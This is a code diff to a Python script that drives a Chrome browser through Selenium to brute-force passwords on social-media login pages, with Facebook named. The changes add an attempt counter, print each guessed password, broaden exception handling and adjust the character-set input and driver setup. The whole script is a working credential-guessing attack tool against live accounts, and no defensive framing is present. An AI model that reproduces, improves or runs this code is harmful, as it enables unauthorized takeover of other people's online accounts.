@@ -75,13 +75,14 @@ def bruteforcer(possible_characters, browser,length):
 	#If the length is zero then
 	if length == 0:
 		temp_length = len(possible_characters)
-	# else:
-	# 	temp_length = length
+	else:
+	 	temp_length = length
 
 	#Flag variable to break out of loop if finds the passcode
 	found = False
 	#Link Identification path for password box
 	password_path = social_media_list.get(choice)[3]
+	tries = 0
 	while True:
 		try:
 			for index in range(temp_length):
@@ -96,15 +97,17 @@ def bruteforcer(possible_characters, browser,length):
 					#Checks to see if password matches
 					#If its a login page Enter the password
 					try:
+						print("Trying password["+str(tries)+"] as: ", pass1)
 						browser.find_element_by_name(password_path).send_keys(pass1)
 						browser.find_element_by_name(password_path).submit()
 					
 					#Else it must be login help page...Skip it by pressing try again button
-					except NoSuchElementException:
+					except:
 						try:
 							browser.find_element_by_name('Try again').click()
 						except NoSuchElementException:
 							print("Page rejected password request")
+					tries += 1
 					
 					#Wait
 					#time.sleep(3)
@@ -213,13 +216,13 @@ def bruteforce():
 			finally:
 				if flag == True and option_choosen >0  and option_choosen < 6:
 					break
-				print("\nEnter option from 1 and 5\n")
+				print("\nEnter option from 1 to 5\n")
 		given_data.append({
 			1: [i for i in string.ascii_lowercase],
 			2: [i for i in string.ascii_uppercase],
 			3: [i for i in range(0,10)],
 			4: [i for i in string.punctuation],
-			5: lambda: input('Enter all characters you want to include.\n==>')
+			5: input('Enter all characters you want to include.\n==>')
 			}.get(option_choosen))
 
 		print(given_data)
@@ -260,8 +263,9 @@ Bear with that...\n==>
 				break
 	
 	#Open Browser
-	browser = webdriver.Chrome(path_to_driver)
 	
+	browser = webdriver.Chrome()
+
 	#Open Facebook Login Page
 
 	browser.get(social_media_list.get(choice)[1])
@@ -270,6 +274,7 @@ Bear with that...\n==>
 	browser.find_element_by_name(username_path).submit()
 
 #I have to still create a bruteforce algorithm-------------------------------
+	print("Initiating Bruteforce.....")
 	bruteforcer(possible_characters,browser,passcode_length)
 #-------------------------------------------------------------------------
 def first_menu():
